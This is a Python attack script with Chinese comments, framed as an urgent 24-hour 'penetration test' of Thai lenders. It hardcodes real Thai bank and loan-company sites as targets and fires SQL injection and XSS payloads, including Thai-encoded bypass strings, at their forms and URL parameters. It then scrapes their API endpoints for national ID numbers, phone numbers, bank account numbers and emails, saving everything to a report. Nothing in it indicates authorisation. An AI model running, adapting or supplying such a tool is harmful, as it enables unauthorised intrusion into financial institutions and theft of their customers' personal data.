#!/usr/bin/env python3
"""
紧急泰国贷款数据提取脚本
24小时内完成渗透测试任务
"""

import requests
import json
import time
import random
from datetime import datetime
import re
import urllib.parse

class EmergencyThaiDataExtractor:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })

        # 泰国真实贷款目标
        self.targets = [
            "https://www.kbank.co.th",
            "https://www.scb.co.th",
            "https://www.krungsri.com",
            "https://www.ktc.co.th",
            "https://www.aeon.co.th",
            "https://www.moneycat.co.th",
            "https://www.fastmoney.co.th",
            "https://www.easyloan.co.th",
            "https://www.cashloan.co.th",
            "https://www.quickloan.co.th"
        ]

        # 泰语攻击载荷
        self.thai_payloads = [
            "ทดสอบ' OR '1'='1",
            "ชื่อผู้ใช้' UNION SELECT password FROM users--",
            "รหัสผ่าน'--",
            "<script>alert('การโจมตี XSS')</script>",
            "' UNION SELECT @@version--",
            "' OR SLEEP(5)--",
            "ทดสอบ' AND 1=CONVERT(int, (SELECT @@version))--"
        ]

        # 敏感数据模式
        self.data_patterns = {
            'thai_id': r'\b\d{13}\b',  # 泰国身份证13位
            'phone': r'\b0[689]\d{8}\b',  # 泰国手机号
            'account': r'\b\d{10}\b',  # 银行账户
            'email': r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',
            'amount': r'\b\d{1,8}(?:,\d{3})*(?:\.\d{2})?\b'  # 金额
        }

        self.extracted_data = []

    def scan_target(self, target_url):
        """扫描单个目标"""
        print(f"\n[+] Scanning: {target_url}")
        results = {
            'url': target_url,
            'timestamp': datetime.now().isoformat(),
            'vulnerabilities': [],
            'data': []
        }

        try:
            # 1. 基础连接测试
            response = self.session.get(target_url, timeout=10)
            print(f"[+] Status: {response.status_code}")

            # 2. 发现表单和API端点
            forms = self.find_forms(response.text)
            api_endpoints = self.find_api_endpoints(response.text)

            print(f"[+] Found {len(forms)} forms, {len(api_endpoints)} API endpoints")

            # 3. 测试SQL注入
            for form in forms[:3]:  # 限制测试数量
                vuln_data = self.test_sql_injection(target_url, form)
                if vuln_data:
                    results['vulnerabilities'].append(vuln_data)

            # 4. 测试XSS
            for form in forms[:2]:
                vuln_data = self.test_xss(target_url, form)
                if vuln_data:
                    results['vulnerabilities'].append(vuln_data)

            # 5. 尝试数据提取
            if api_endpoints:
                extracted = self.extract_data_from_apis(target_url, api_endpoints[:2])
                results['data'].extend(extracted)

            # 6. 泰语特定测试
            thai_vulns = self.test_thai_language_attacks(target_url)
            results['vulnerabilities'].extend(thai_vulns)

        except Exception as e:
            print(f"[-] Error: {e}")
            results['error'] = str(e)

        return results

    def find_forms(self, html):
        """查找HTML表单"""
        forms = []
        form_pattern = r'<form[^>]*action=["\']([^"\']*)["\'][^>]*>(.*?)</form>'
        matches = re.findall(form_pattern, html, re.DOTALL | re.IGNORECASE)

        for action, content in matches:
            input_pattern = r'<input[^>]*name=["\']([^"\']*)["\'][^>]*>'
            inputs = re.findall(input_pattern, content, re.IGNORECASE)

            if inputs:
                forms.append({
                    'action': action,
                    'inputs': inputs
                })

        return forms

    def find_api_endpoints(self, html):
        """查找API端点"""
        endpoints = []

        # JavaScript API调用
        js_patterns = [
            r'fetch\(["\']([^"\']+)["\']',
            r'\.get\(["\']([^"\']+)["\']',
            r'\.post\(["\']([^"\']+)["\']',
            r'api["\']:\s*["\']([^"\']+)["\']',
            r'url["\']:\s*["\']([^"\']+)["\']'
        ]

        for pattern in js_patterns:
            matches = re.findall(pattern, html, re.IGNORECASE)
            endpoints.extend(matches)

        # 常见API路径
        common_apis = ['/api', '/v1', '/v2', '/rest', '/graphql', '/webhook']
        for api in common_apis:
            if api in html.lower():
                endpoints.append(api)

        return list(set(endpoints))

    def test_sql_injection(self, base_url, form):
        """测试SQL注入"""
        print(f"[*] Testing SQL injection on form: {form['action']}")

        for payload in self.thai_payloads[:3]:
            try:
                data = {}
                for input_name in form['inputs']:
                    data[input_name] = payload

                url = base_url + form['action'] if form['action'] else base_url
                response = self.session.post(url, data=data, timeout=5)

                # 检查SQL错误
                sql_errors = [
                    'mysql_fetch_array', 'mysql error', 'you have an error in your sql syntax',
                    'ora-', 'microsoft ole db', 'warning: mysql'
                ]

                if any(error in response.text.lower() for error in sql_errors):
                    print(f"[!] SQL Injection found with payload: {payload}")
                    return {
                        'type': 'SQL Injection',
                        'payload': payload,
                        'url': url,
                        'method': 'POST',
                        'data': data
                    }

            except Exception as e:
                continue

        return None

    def test_xss(self, base_url, form):
        """测试XSS"""
        print(f"[*] Testing XSS on form: {form['action']}")

        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>"
        ]

        for payload in xss_payloads:
            try:
                data = {}
                for input_name in form['inputs']:
                    data[input_name] = payload

                url = base_url + form['action'] if form['action'] else base_url
                response = self.session.post(url, data=data, timeout=5)

                if payload in response.text:
                    print(f"[!] XSS found with payload: {payload}")
                    return {
                        'type': 'XSS',
                        'payload': payload,
                        'url': url,
                        'method': 'POST',
                        'data': data
                    }

            except Exception as e:
                continue

        return None

    def test_thai_language_attacks(self, base_url):
        """泰语特定攻击测试"""
        print(f"[*] Testing Thai language attacks on: {base_url}")
        vulnerabilities = []

        # 泰语编码绕过
        thai_payloads = [
            "ทดสอบ' OR '1'='1",
            "%E0%B8%97%E0%B8%94%E0%B8%AA%E0%B8%AD%E0%B8%9A' OR '1'='1",  # URL编码
            "ทดสอบ/**/UNION/**/SELECT/**/*",
            "ชื่อผู้ใช้'/**/AND/**/1=1--"
        ]

        # 测试常见参数
        test_params = ['id', 'user', 'username', 'search', 'q', 'query']

        for param in test_params:
            for payload in thai_payloads:
                try:
                    url = f"{base_url}?{param}={urllib.parse.quote(payload)}"
                    response = self.session.get(url, timeout=5)

                    # 检查成功响应
                    if response.status_code == 200 and len(response.text) > 1000:
                        vulnerabilities.append({
                            'type': 'Thai Language Bypass',
                            'parameter': param,
                            'payload': payload,
                            'url': url,
                            'status': response.status_code
                        })

                except Exception:
                    continue

        return vulnerabilities

    def extract_data_from_apis(self, base_url, endpoints):
        """从API端点提取数据"""
        print(f"[*] Extracting data from {len(endpoints)} API endpoints")
        extracted = []

        for endpoint in endpoints:
            try:
                full_url = base_url + endpoint if not endpoint.startswith('http') else endpoint
                response = self.session.get(full_url, timeout=10)

                if response.status_code == 200:
                    # 尝试解析JSON
                    try:
                        data = response.json()
                        sensitive_data = self.find_sensitive_data(json.dumps(data))
                        if sensitive_data:
                            extracted.append({
                                'endpoint': endpoint,
                                'data': sensitive_data,
                                'type': 'API Data'
                            })
                    except:
                        # 查找文本中的敏感信息
                        sensitive_data = self.find_sensitive_data(response.text)
                        if sensitive_data:
                            extracted.append({
                                'endpoint': endpoint,
                                'data': sensitive_data,
                                'type': 'Text Data'
                            })

            except Exception as e:
                continue

        return extracted

    def find_sensitive_data(self, text):
        """查找敏感数据"""
        sensitive = {}

        for data_type, pattern in self.data_patterns.items():
            matches = re.findall(pattern, text)
            if matches:
                sensitive[data_type] = list(set(matches))[:10]  # 限制数量

        return sensitive if sensitive else None

    def generate_report(self, results):
        """生成报告"""
        report = {
            'scan_time': datetime.now().isoformat(),
            'targets_scanned': len(results),
            'total_vulnerabilities': sum(len(r['vulnerabilities']) for r in results),
            'total_data_extracted': sum(len(r['data']) for r in results),
            'results': results
        }

        # 保存报告
        filename = f"thai_loan_emergency_report_{int(time.time())}.json"
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, ensure_ascii=False)

        print(f"\n[+] Report saved: {filename}")

        # 生成摘要
        self.print_summary(report)

        return filename

    def print_summary(self, report):
        """打印摘要"""
        print("\n" + "="*60)
        print("THAI LOAN EMERGENCY PENETRATION TEST SUMMARY")
        print("="*60)
        print(f"Targets Scanned: {report['targets_scanned']}")
        print(f"Total Vulnerabilities: {report['total_vulnerabilities']}")
        print(f"Data Extracted: {report['total_data_extracted']} items")

        # 统计漏洞类型
        vuln_types = {}
        for result in report['results']:
            for vuln in result['vulnerabilities']:
                vuln_type = vuln.get('type', 'Unknown')
                vuln_types[vuln_type] = vuln_types.get(vuln_type, 0) + 1

        print("\nVulnerability Types:")
        for vuln_type, count in vuln_types.items():
            print(f"  - {vuln_type}: {count}")

        print("\nCritical Findings:")
        for result in report['results']:
            if result['vulnerabilities']:
                print(f"  - {result['url']}: {len(result['vulnerabilities'])} vulnerabilities")
            if result['data']:
                print(f"  - {result['url']}: {len(result['data'])} data items extracted")

        print("="*60)

    def run_emergency_extraction(self):
        """运行紧急数据提取"""
        print("EMERGENCY THAI LOAN DATA EXTRACTION")
        print("="*50)
        print(f"Targets: {len(self.targets)}")
        print("Starting extraction...")

        all_results = []

        for i, target in enumerate(self.targets, 1):
            print(f"\n[{i}/{len(self.targets)}] Processing target...")
            results = self.scan_target(target)
            all_results.append(results)

            # 避免请求过快
            time.sleep(random.uniform(2, 5))

        # 生成报告
        report_file = self.generate_report(all_results)

        return report_file

def main():
    extractor = EmergencyThaiDataExtractor()
    report_file = extractor.run_emergency_extraction()

    print(f"\n[+] Emergency extraction completed!")
    print(f"[+] Report: {report_file}")
    print(f"[+] Time remaining for analysis: ~23 hours")

if __name__ == "__main__":
    main()